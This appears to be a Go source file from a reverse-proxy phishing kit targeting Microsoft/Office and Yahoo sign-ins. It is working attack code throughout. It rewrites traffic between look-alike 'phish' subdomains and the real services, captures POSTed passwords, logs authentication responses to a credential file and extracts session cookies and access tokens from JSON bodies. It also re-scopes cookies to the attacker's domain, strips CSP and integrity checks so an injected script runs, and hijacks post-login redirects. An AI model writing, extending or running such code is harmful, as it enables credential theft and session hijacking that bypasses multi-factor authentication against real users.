package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"time"

	capture "ms-proxy/internal/capture"
)

// ══════════════════════════════════════════════════════════
//  REQUEST REWRITING (phish → real)
// ══════════════════════════════════════════════════════════

func rewriteRequest(req *http.Request, originalHost, upstream string, target *Target, session *Session) {
	// Resolve the tenant base domain from the propagated request context, then
	// materialize this tenant's phish→real routing map.
	baseDomain := baseDomainOf(req)
	hostMap := target.HostMapFor(baseDomain)

	req.Host = upstream

	if originalHost == target.EntrySubdomainFor(baseDomain) && (req.URL.Path == "/" || req.URL.Path == "") {
		req.URL.Path = target.EntryPath
		req.URL.RawQuery = target.EntryQuery
	}

	if session != nil && target.ServiceUpstream != "" && upstream == target.ServiceUpstream && session.Password != "" {
		session.ReachedService = true
	}

	req.Header.Del("Accept-Encoding")

	if origin := req.Header.Get("Origin"); origin != "" {
		req.Header.Set("Origin", patchURLString(origin, hostMap))
	}
	if referer := req.Header.Get("Referer"); referer != "" {
		req.Header.Set("Referer", patchURLString(referer, hostMap))
	}
	if req.URL.RawQuery != "" {
		req.URL.RawQuery = patchURLString(req.URL.RawQuery, hostMap)
	}

	if strings.Contains(req.URL.Path, "oauth20_authorize") ||
		strings.Contains(req.URL.Path, "oauth2/v2.0/authorize") {
		q := req.URL.Query()
		if ru := q.Get("redirect_uri"); ru != "" {
			ru = strings.ReplaceAll(ru, "office."+baseDomain, "www.office.com")
			ru = strings.ReplaceAll(ru, "micro."+baseDomain, "www.office.com")
			q.Set("redirect_uri", ru)
			req.URL.RawQuery = q.Encode()
		}
	}

	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Del("X-Forwarded-For")
	req.Header.Del("Cf-Connecting-Ip")
	req.Header.Del("Cf-Ray")
	req.Header.Del("Cf-Visitor")

	if req.Method == "POST" && req.Body != nil {
		body, err := io.ReadAll(req.Body)
		if err != nil {
			return
		}
		req.Body.Close()

		contentType := req.Header.Get("Content-Type")

		if target != nil {
			capture.Credentials(originalHost+req.URL.Path, string(body), contentType, target.Name)
		}

		bodyStr := patchURLString(string(body), hostMap)

		newBody := []byte(bodyStr)
		req.Body = io.NopCloser(bytes.NewReader(newBody))
		req.ContentLength = int64(len(newBody))
		req.Header.Set("Content-Length", strconv.Itoa(len(newBody)))
	}
}

// ══════════════════════════════════════════════════════════
//  NEXT.JS RSC FLIGHT PROTECTION
// ══════════════════════════════════════════════════════════

func protectFlightScripts(html string) (string, func(string) string) {
	type seg struct{ placeholder, original string }
	var segs []seg
	const marker = "self.__next_f.push("
	const closeTag = "</script>"
	result := html
	offset := 0
	n := 0
	for {
		idx := strings.Index(result[offset:], marker)
		if idx == -1 {
			break
		}
		markerPos := offset + idx
		scriptStart := strings.LastIndex(result[:markerPos], "<script")
		if scriptStart == -1 {
			offset = markerPos + len(marker)
			continue
		}
		scriptEnd := strings.Index(result[markerPos:], closeTag)
		if scriptEnd == -1 {
			break
		}
		end := markerPos + scriptEnd + len(closeTag)
		original := result[scriptStart:end]
		placeholder := fmt.Sprintf("\x00FLIGHT%d\x00", n)
		segs = append(segs, seg{placeholder, original})
		result = result[:scriptStart] + placeholder + result[end:]
		offset = scriptStart + len(placeholder)
		n++
	}
	return result, func(s string) string {
		for _, sg := range segs {
			s = strings.Replace(s, sg.placeholder, sg.original, 1)
		}
		return s
	}
}

// ══════════════════════════════════════════════════════════
//  IMMUTABLE (SRI-HASHED) STATIC ASSETS
// ══════════════════════════════════════════════════════════

func isImmutableAsset(path string) bool {
	lower := strings.ToLower(path)
	return strings.Contains(lower, ".chunk.js") ||
		strings.Contains(lower, "/assets/")
}

// ══════════════════════════════════════════════════════════
//  RESPONSE REWRITING (real → phish)
// ══════════════════════════════════════════════════════════

func rewriteResponse(resp *http.Response, originalReq *http.Request, session *Session, target *Target) error {
	// Resolve the tenant base domain and materialize this tenant's real→phish
	// rewriting map.
	baseDomain := baseDomainOf(originalReq)
	reverseMap := target.ReverseMapFor(baseDomain)

	for _, h := range securityHeaders {
		resp.Header.Del(h)
	}

	if loc := resp.Header.Get("Location"); loc != "" {
		resp.Header.Set("Location", patchURLString(loc, reverseMap))
	}

	for _, hdr := range []string{"Link"} {
		if v := resp.Header.Get(hdr); v != "" {
			v = patchURLString(v, reverseMap)
			for real, phish := range reverseMap {
				v = strings.ReplaceAll(v, real, phish)
			}
			resp.Header.Set(hdr, v)
		}
	}

	setCORS(resp, originalReq)
	patchCookies(resp, baseDomain)

	mime := strings.Split(resp.Header.Get("Content-Type"), ";")[0]
	mime = strings.TrimSpace(strings.ToLower(mime))

	if strings.Contains(mime, "x-component") {
		log.Printf("[<] %d | %s | (RSC flight passthrough)", resp.StatusCode, mime)
		return nil
	}

	if isImmutableAsset(originalReq.URL.Path) {
		log.Printf("[<] %d | %s | (immutable asset passthrough)", resp.StatusCode, mime)
		return nil
	}

	buffer, err := decompress(resp)
	if err != nil {
		log.Printf("[!] Decompress failed: %v — stripping encoding header", err)
		resp.Header.Del("Content-Encoding")
		resp.Header.Del("Transfer-Encoding")
		return nil
	}

	isText := target.ModifyMimes[mime] ||
		strings.Contains(mime, "javascript") ||
		strings.Contains(mime, "json") ||
		strings.Contains(mime, "html") ||
		strings.Contains(mime, "text") ||
		strings.Contains(mime, "xml")

	if isText {
		text := string(buffer)

		var restoreFlight func(string) string
		if mime == "text/html" {
			text, restoreFlight = protectFlightScripts(text)
		}

		// ── Log JSON API responses containing auth/login data ──
		if mime == "application/json" && isAuthEndpoint(originalReq.URL.Path) {
			fmt.Println()
			fmt.Println("┌──────────────────────────────────────────────────────")
			fmt.Printf("│ [API RESPONSE] %s %s\n", originalReq.Method, originalReq.URL.Path)
			fmt.Printf("│ Status: %d\n", resp.StatusCode)
			fmt.Printf("│ Body: %s\n", truncateStr(text, 2000))
			fmt.Println("└──────────────────────────────────────────────────────")
			fmt.Println()

			entry := fmt.Sprintf("\n[%s] API RESPONSE: %s %s (status %d)\n  BODY: %s\n\n",
				time.Now().Format(time.RFC3339), originalReq.Method, originalReq.URL.Path, resp.StatusCode, text)
			appendToFile(credLogFile, entry)

			if resp.StatusCode == 200 && session != nil && !session.IsDone {
				if strings.Contains(text, `"success":true`) ||
					strings.Contains(text, `"Success"`) ||
					strings.Contains(text, `"login sucessfull"`) {

					extractJSONCookies(text, session, target)

					if target.ServiceUpstream == "" {
						session.IsDone = true
						fmt.Printf("[✓] [%d] [%s] LOGIN SUCCESSFUL — session marked for termination\n",
							session.Index, target.Name)
						saveTokens(session, target)
					} else {
						fmt.Printf("[✓] [%d] [%s] LOGIN SUCCESSFUL — waiting for service cookies (%s)\n",
							session.Index, target.Name, target.ServiceUpstream)
					}
				}
			}
		}

		// ── Standard URL rewriting ──
		// SKIPPED for HTML on SkipHTMLRewrite targets (Yahoo). Their RSC flight
		// data is length-prefixed and cannot be rewritten, so the HTML body must
		// keep its ORIGINAL URLs too — otherwise the server HTML and the flight
		// data diverge, React's hydration mismatches (error #418), and the page
		// (background included) fails to render. For those targets the credential
		// + cookie handoff is done client-side by inject.js. JS/CSS/JSON still
		// get rewritten.
		if !(mime == "text/html" && target.SkipHTMLRewrite) {
			text = patchURLString(text, reverseMap)
		}

		// Nuclear bare-domain replace. Skipped for HTML on SkipNuclearHTML or
		// SkipHTMLRewrite targets (same hydration rationale); longest keys first
		// so subdomains replace before their parent domain.
		if !(mime == "text/html" && (target.SkipNuclearHTML || target.SkipHTMLRewrite)) {
			keys := make([]string, 0, len(reverseMap))
			for real := range reverseMap {
				keys = append(keys, real)
			}
			sort.Slice(keys, func(i, j int) bool { return len(keys[i]) > len(keys[j]) })
			for _, real := range keys {
				text = strings.ReplaceAll(text, real, reverseMap[real])
			}
		}

		if session != nil && session.IsDone && mime == "application/json" {
			targetURL := defaultTerminateURL
			if u, ok := terminationURLs[target.Name]; ok {
				targetURL = u
			}
			text = hijackRedirectURLs(text, targetURL)
		}

		if mime == "text/html" {
			// For Next.js / SkipHTMLRewrite targets, keepAttrs=true preserves the
			// integrity/crossorigin attributes (stripping them is itself a
			// hydration mismatch → #418) while still removing the CSP <meta> so
			// the interceptor runs; injectPayload places the script at the end of
			// <body> (outside the hydrated tree) for the same reason.
			text = stripIntegrity(text, target.SkipHTMLRewrite)
			text = capture.InjectPayload(text)
			text = restoreFlight(text)
		}

		buffer = []byte(text)
	}

	resp.Header.Del("Content-Encoding")
	resp.Header.Del("Transfer-Encoding")
	resp.Body = io.NopCloser(bytes.NewReader(buffer))
	resp.ContentLength = int64(len(buffer))
	resp.Header.Set("Content-Length", strconv.Itoa(len(buffer)))
	resp.Header.Set("Cache-Control", "no-cache, no-store, no-transform")

	if isText {
		log.Printf("[<] %d | %s | %dB (modified, uncompressed)", resp.StatusCode, mime, len(buffer))
	} else {
		log.Printf("[<] %d | %s | %dB (passthrough, uncompressed)", resp.StatusCode, mime, len(buffer))
	}

	return nil
}

// ══════════════════════════════════════════════════════════
//  REDIRECT HIJACKING
// ══════════════════════════════════════════════════════════

func hijackRedirectURLs(text string, targetURL string) string {
	redirectKeys := []string{
		`"redirectUrl":"`,
		`"redirect_url":"`,
		`"redirect_uri":"`,
		`"returnUrl":"`,
		`"returnTo":"`,
		`"returnURL":"`,
		`"loginUrl":"`,
		`"login_url":"`,
		`"nextUrl":"`,
	}

	for _, key := range redirectKeys {
		searchFrom := 0
		for {
			idx := strings.Index(text[searchFrom:], key)
			if idx == -1 {
				break
			}
			idx += searchFrom
			start := idx + len(key)
			end := strings.Index(text[start:], `"`)
			if end == -1 {
				break
			}
			original := text[start : start+end]

			if strings.HasPrefix(original, "http") && original != targetURL {
				text = text[:start] + targetURL + text[start+end:]
				fmt.Printf("[→] Redirect hijacked: %s → %s\n", truncateStr(original, 80), targetURL)
				searchFrom = start + len(targetURL)
			} else {
				searchFrom = start + end
			}
		}
	}

	return text
}

// ══════════════════════════════════════════════════════════
//  JSON COOKIE EXTRACTION
// ══════════════════════════════════════════════════════════

func extractJSONCookies(body string, session *Session, target *Target) {
	idx := strings.Index(body, `"cookies"`)
	if idx == -1 {
		return
	}

	section := body[idx:]
	for {
		valIdx := strings.Index(section, `"value":"`)
		if valIdx == -1 {
			break
		}

		valStart := valIdx + len(`"value":"`)
		rest := section[valStart:]
		valEnd := strings.Index(rest, `"`)
		if valEnd == -1 {
			break
		}
		tokenValue := rest[:valEnd]

		nameSection := section[:valIdx]
		cookieName := "TOKEN"
		innerBrace := strings.LastIndex(nameSection, `":{"`)
		if innerBrace != -1 {
			beforeBrace := nameSection[:innerBrace]
			lastQuote := strings.LastIndex(beforeBrace, `"`)
			if lastQuote != -1 {
				keyStart := strings.LastIndex(beforeBrace[:lastQuote], `"`)
				if keyStart != -1 {
					cookieName = beforeBrace[keyStart+1 : lastQuote]
				}
			}
		}

		if tokenValue != "" && len(tokenValue) > 10 {
			session.CookieTokens[cookieName] = tokenValue
			fmt.Printf("[+] [%d] [%s] SESSION TOKEN (JSON body): %s = %s\n",
				session.Index, target.Name, cookieName, truncate(tokenValue, 60))
		}

		section = rest[valEnd:]
	}

	for _, pattern := range []string{`"token":"`, `"access_token":"`, `"session_token":"`, `"id_token":"`} {
		tIdx := strings.Index(body, pattern)
		if tIdx != -1 {
			tStart := tIdx + len(pattern)
			tRest := body[tStart:]
			tEnd := strings.Index(tRest, `"`)
			if tEnd != -1 {
				tVal := tRest[:tEnd]
				if len(tVal) > 20 {
					keyName := strings.Trim(pattern, `":`)
					session.CookieTokens[keyName] = tVal
					fmt.Printf("[+] [%d] [%s] SESSION TOKEN (JSON body): %s = %s\n",
						session.Index, target.Name, keyName, truncate(tVal, 60))
				}
			}
		}
	}
}

// ══════════════════════════════════════════════════════════
//  AUTH ENDPOINT DETECTION
// ══════════════════════════════════════════════════════════

func isAuthEndpoint(path string) bool {
	authPaths := []string{
		"login", "signin", "auth", "token", "session",
		"saml", "oauth", "credential", "authenticate",
	}
	lower := strings.ToLower(path)
	for _, p := range authPaths {
		if strings.Contains(lower, p) {
			return true
		}
	}
	return false
}

func truncateStr(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// ══════════════════════════════════════════════════════════
//  CORS
// ══════════════════════════════════════════════════════════

func setCORS(resp *http.Response, originalReq *http.Request) {
	origin := originalReq.Header.Get("Origin")
	if origin != "" {
		resp.Header.Set("Access-Control-Allow-Origin", origin)
	} else {
		resp.Header.Set("Access-Control-Allow-Origin", "*")
	}
	resp.Header.Set("Access-Control-Allow-Credentials", "true")
	resp.Header.Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH, OPTIONS")
	resp.Header.Set("Access-Control-Allow-Headers", "*")
}

// ══════════════════════════════════════════════════════════
//  COOKIE PATCHING
// ══════════════════════════════════════════════════════════

// patchCookies re-scopes upstream Set-Cookie headers to THIS tenant's base
// domain so the browser sends them back to the phish subdomains.
func patchCookies(resp *http.Response, baseDomain string) {
	cookies := resp.Cookies()
	if len(cookies) == 0 {
		return
	}
	resp.Header.Del("Set-Cookie")
	for _, ck := range cookies {
		if strings.HasPrefix(ck.Name, "__Host-") {
			ck.Domain = ""
			ck.Path = "/"
			ck.Secure = true
		} else {
			ck.Domain = "." + baseDomain
		}
		if ck.Secure {
			ck.SameSite = http.SameSiteNoneMode
		}
		resp.Header.Add("Set-Cookie", ck.String())
	}
}

// ══════════════════════════════════════════════════════════
//  URL PATCHING
// ══════════════════════════════════════════════════════════

func patchURLString(text string, m map[string]string) string {
	if text == "" {
		return text
	}

	for from, to := range m {
		text = strings.ReplaceAll(text, "https://"+from, "https://"+to)
		text = strings.ReplaceAll(text, "http://"+from, "http://"+to)
		text = strings.ReplaceAll(text, "//"+from, "//"+to)
		text = strings.ReplaceAll(text, "https%3A%2F%2F"+from, "https%3A%2F%2F"+to)
		text = strings.ReplaceAll(text, "http%3A%2F%2F"+from, "http%3A%2F%2F"+to)
		text = strings.ReplaceAll(text, "https%3a%2f%2f"+from, "https%3a%2f%2f"+to)
		text = strings.ReplaceAll(text, "http%3a%2f%2f"+from, "http%3a%2f%2f"+to)
	}

	for from, to := range m {
		text = strings.ReplaceAll(text, `"`+from+`"`, `"`+to+`"`)
		text = strings.ReplaceAll(text, `'`+from+`'`, `'`+to+`'`)
	}

	for from, to := range m {
		encFrom := url.QueryEscape(from)
		encFrom = strings.ReplaceAll(encFrom, ".", "%2E")
		encTo := url.QueryEscape(to)
		encTo = strings.ReplaceAll(encTo, ".", "%2E")
		if encFrom != encTo {
			text = strings.ReplaceAll(text, encFrom, encTo)
		}
	}

	return text
}

// ══════════════════════════════════════════════════════════
//  HTML INTEGRITY STRIPPING
// ══════════════════════════════════════════════════════════

// stripIntegrity removes Subresource-Integrity attributes and CSP <meta> tags.
// For keepAttrs targets (Next.js / SkipHTMLRewrite) the integrity/crossorigin
// attributes are PRESERVED — stripping them changes the server HTML and trips
// React error #418 — but the CSP <meta> is still removed so the injected
// interceptor executes.
func stripIntegrity(html string, keepAttrs bool) string {
	result := html
	if !keepAttrs {
		result = removeHTMLAttr(result, "integrity")
		result = removeHTMLAttr(result, "crossorigin")
	}

	for {
		lower := strings.ToLower(result)
		idx := strings.Index(lower, `<meta http-equiv="content-security-policy"`)
		if idx == -1 {
			idx = strings.Index(lower, `<meta http-equiv='content-security-policy'`)
		}
		if idx == -1 {
			break
		}
		end := strings.Index(result[idx:], ">")
		if end == -1 {
			break
		}
		result = result[:idx] + result[idx+end+1:]
	}

	return result
}

func removeHTMLAttr(html, attr string) string {
	lower := strings.ToLower(html)
	search := strings.ToLower(attr) + "="
	for {
		idx := strings.Index(lower, search)
		if idx == -1 {
			break
		}
		quotePos := idx + len(search)
		if quotePos >= len(html) {
			break
		}
		quote := html[quotePos]
		if quote != '"' && quote != '\'' {
			lower = lower[quotePos:]
			continue
		}
		rest := html[quotePos+1:]
		endIdx := strings.IndexByte(rest, quote)
		if endIdx == -1 {
			break
		}
		removeEnd := quotePos + 1 + endIdx + 1
		removeStart := idx
		for removeStart > 0 && isWhitespace(html[removeStart-1]) {
			removeStart--
		}
		html = html[:removeStart] + html[removeEnd:]
		lower = strings.ToLower(html)
	}
	return html
}

func isWhitespace(b byte) bool {
	return b == ' ' || b == '\t' || b == '\n' || b == '\r'
}